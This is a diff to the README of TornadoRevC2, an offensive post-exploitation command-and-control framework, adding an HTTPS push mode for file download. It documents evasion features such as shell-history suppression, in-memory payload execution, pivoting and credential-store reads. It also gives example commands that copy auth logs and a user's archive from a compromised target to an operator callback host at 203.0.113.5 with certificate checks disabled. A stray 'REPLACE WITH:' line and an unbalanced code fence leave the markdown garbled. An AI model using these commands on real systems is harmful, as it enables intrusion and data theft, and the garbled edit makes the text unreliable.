@@ -57,7 +57,7 @@ TornadoRevC2 is a modular post-exploitation framework that handles sessions over
 |----------|-------------|
 | **Session handling** | Multi-client TCP / TLS / mTLS listeners with automatic PKI bootstrapping · On-demand mTLS upgrade for live sessions · **Bind shell support** — dial a target listening on TCP or TLS · Interactive PTY/TTY shells · Session fingerprinting and reconnect tracking |
 | **Operational security** | Shell history suppression on Linux and Windows · No `pty.spawn` or `Invoke-Expression` in command paths · Session-scoped probe markers · Jitter between automated commands · Host deny-list guardrails that refuse production-looking targets · PTY upgrade verification (falls back to the original shell when bash handoff fails) |
-| **File transfer** | Chunked upload with resume · Chunked download with resume · SHA-256 integrity verification · Optional HTTPS transport (`--https`) with target-interface binding and callback address override |
+| **File transfer** | Chunked upload with resume · Chunked download with resume · SHA-256 integrity verification · Optional HTTPS transport for upload (`--https`) and push-style download (`--https-push`), with target-interface binding and callback address override |
 | **Payload execution** | In-memory execution for `py`, `ps`, `exe`, `elf`, `bat`, and `sh` — with memfd-based ELF execution (modern and legacy fallbacks) and subsystem-aware PE loading |
 | **Pivoting & tunneling** | SOCKS5 proxy through compromised sessions with automatic remote agent cleanup on stop · Soft and hard tunnel reset (`socks reset [--hard]`) · Ligolo-NG and Chisel agent deployment with background persistence |
 | **Remote session establishment** | `make_token` — establish new sessions over SSH, WinRM, SMB, WMI, MSSQL, DCOM, or MySQL/MariaDB from the operator side, with password / NTLM-hash / SSH-key / WinRM-client-certificate authentication, MySQL UDF auto-loading, custom-command execution, and netexec integration |
@@ -299,6 +299,8 @@ run credstore 1                   # Credential store metadata
 run memorymap 1 1234              # Process memory maps (requires PID)
 run inmemory 1 sh ./linpeas.sh    # In-memory script execution
 run upgrade_mtls 1 --port 9443    # Migrate session to the mTLS listener
+upload --https eth0 1 ./tool "C:\Temp\tool.exe"       # HTTPS upload
+download --https-push 1 /var/log/auth.log ./auth.log  # HTTPS push download
 update                            # Pull latest from GitHub and restart (Git installs)
 ```
 
@@ -370,34 +372,52 @@ All transfer commands accept a `--resume` flag (`-r`) to continue an interrupted
 | `upload [--resume] <ID> <local> <remote>` | Upload with chunked transfer |
 | `upload --https [iface] [-RH host[:port]] [--resume] <ID> <local> <remote>` | Upload over HTTPS |
 | `download [--resume] <ID> <remote> <local>` | Download with chunked transfer |
+| `download --https-push [iface] [-RH host[:port]] <ID> <remote> <local>` | Download over HTTPS — the handler runs a one-shot HTTPS upload endpoint and the target PUTs the file to it |
 | `verify <ID> <remote>` / `hash <ID> <remote>` | Verify remote file size and SHA-256 |
 
-**HTTPS upload flags:**
+**HTTPS flags:**
 
 | Flag | Description |
 |------|-------------|
-| `--https` | Use HTTPS transport instead of the default chunked/line-based path |
-| `--https <iface>` | Bind the operator-side HTTPS server to the named interface (e.g. `eth0`, `tun0`) or IP address. Default: `0.0.0.0` |
+| `--https` | **Upload only.** Use HTTPS transport instead of the default chunked/line-based path |
+| `--https-push` | **Download only.** Handler starts an HTTPS upload server; the target pushes the file to it |
+| `--https <iface>` / `--https-push <iface>` | Bind the operator-side HTTPS server to the named interface (e.g. `eth0`, `tun0`) or IP address. Default: `0.0.0.0` |
 | `-RH <host>[:<port>]` | Host and/or port the target should connect back to. Useful when the target reaches the handler through a NAT or redirector. Default: auto-detected from the bind interface or the reverse shell's local endpoint |
 
-The HTTPS upload uses the handler's existing `tls_certs/server.pem` and `tls_certs/server.key`. Targets skip certificate verification (self-signed cert). The Windows side uses `Invoke-WebRequest` with `-SkipCertificateCheck` on PowerShell 6+ or a `ServerCertificateValidationCallback` shim on 5.1. On Linux and Unix, the target command chain tries `curl -k`, then `wget --no-check-certificate`, then `python3` or `python` with an unverified SSL context.
+Both HTTPS transports use the handler's existing `tls_certs/server.pem` and `tls_certs/server.key` — no additional certificates are generated. Targets skip certificate verification (self-signed cert). On Windows, the target tries `curl.exe -T` first, then `WebClient.UploadFile(... 'PUT' ...)` for push, or `Invoke-WebRequest` with `-SkipCertificateCheck` on PowerShell 6+ and a `ServerCertificateValidationCallback` shim on 5.1 for pull. On Linux and Unix, the target command chain tries `curl -k`, then `wget --no-check-certificate`, then `python3` or `python` with an unverified SSL context.
+
+**Resume is not supported** for either HTTPS transport (`--https` upload or `--https-push` download). Passing `--resume` prints a warning and performs a full transfer. Use the default chunked paths (`upload --resume` / `download --resume`) when resume is required.
 
 **Remote path resolution:** if the remote path refers to a directory (either ends with a separator, or exists as a directory on the target), the local file's basename is appended automatically. So `upload 1 ./report.md /tmp/` writes to `/tmp/report.md`, and `upload 1 ./report.md C:\Users\Alice` writes to `C:\Users\Alice\report.md`.
 
+
+**REPLACE WITH:**
+
+```markdown
 **Example:**
 
 ```bash
 # Default transport (line-based on Windows, chunked on Linux)
 upload 1 ./tool.exe "C:\Temp\tool.exe"
 
-# HTTPS transport, bind to eth0, advertise a public IP:port to the target
+# HTTPS upload, bind to eth0, advertise a public IP:port to the target
 upload --https eth0 -RH 203.0.113.5:8443 1 ./tool.exe "C:\Temp\tool.exe"
 
-# HTTPS with resume
+# HTTPS upload with resume (warning printed; full upload performed)
 upload --https --resume 1 ./big.iso "C:\Temp\big.iso"
 
-# Download with resume
+# Default chunked download with resume
 download --resume 1 /var/log/auth.log ./auth.log
+
+# HTTPS push download — handler hosts the endpoint, target PUTs the file
+download --https-push 1 /home/kamal/Documents/archive.zip ./archive.zip
+
+# HTTPS push download bound to a specific interface, with a reachable callback
+download --https-push eth0 -RH 203.0.113.5:9444 1 /var/log/auth.log ./auth.log
+
+# Passing a directory as <local> appends the remote file's basename
+# → writes ./logs/auth.log (dir created if missing)
+download --https-push 1 /var/log/auth.log ./logs
 ```
 
 ### In-memory execution
@@ -1093,11 +1113,18 @@ If the client connects using an IP address, the server certificate should includ
 
 ### HTTPS file transfer
 
-The `--https` upload flag starts a transient HTTPS server on the operator side using the same `tls_certs/server.pem` and `tls_certs/server.key` used by the TLS listener. No additional certificates are generated. Targets skip certificate verification when downloading the file, so the CN of the certificate does not need to match the advertised host.
+TornadoRevC2 has two HTTPS file-transfer modes, both served by a transient operator-side HTTPS server that reuses the handler's hardened TLS context (`tls_certs/server.pem` + `tls_certs/server.key`, same ciphers, TLS 1.2 floor, and `OP_*` flags as the TLS listener). No additional certificates are generated.
 
-The server binds to the address resolved from the optional interface argument (`--https eth0`), to `0.0.0.0` if omitted, or to a specific IP if passed directly (`--https 10.10.14.7`). The URL advertised to the target uses the `-RH` value if provided, otherwise the bind IP, otherwise the interface the reverse shell sees the handler on.
+- **`--https` (upload)** — the operator serves the file; the target downloads it (`curl -k`, `wget --no-check-certificate`, `Invoke-WebRequest`, or `certutil`).
+- **`--https-push` (download)** — the operator serves an upload endpoint at `/upload`; the target pushes the file to it via HTTP `PUT` (`curl.exe -T` or `WebClient.UploadFile` on Windows, `curl -T`, `python3`, or `python2` on Linux/Unix). The body is streamed directly to the local file — the operator never buffers the whole file in memory.
 
-The HTTPS server is torn down immediately after the transfer completes or fails. It does not persist between uploads.
+For both modes the server binds to the address resolved from the optional interface argument (`--https eth0` / `--https-push eth0`), to `0.0.0.0` if omitted, or to a specific IP if passed directly (`--https 10.10.14.7`). The URL advertised to the target uses the `-RH` value if provided, otherwise the bind IP, otherwise the interface the reverse shell sees the handler on.
+
+The HTTPS server is torn down immediately after the transfer completes or fails. It does not persist between transfers.
+
+**Integrity and correctness:** both modes compute the target-side SHA-256 before starting the transfer, verify the received/sent bytes against it after transfer, and abort with a clear error on mismatch. **Resume is not available** on the HTTPS transports — use the default chunked paths for resumable transfers.
+
+**Local path resolution (download):** if the `<local>` argument is an existing directory, ends with `/` or `\`, or is otherwise a directory on the operator machine, the remote file's basename is appended automatically. `download --https-push 1 /etc/hosts ./logs` writes `./logs/hosts`, not `./logs`.
 
 ### mTLS
 
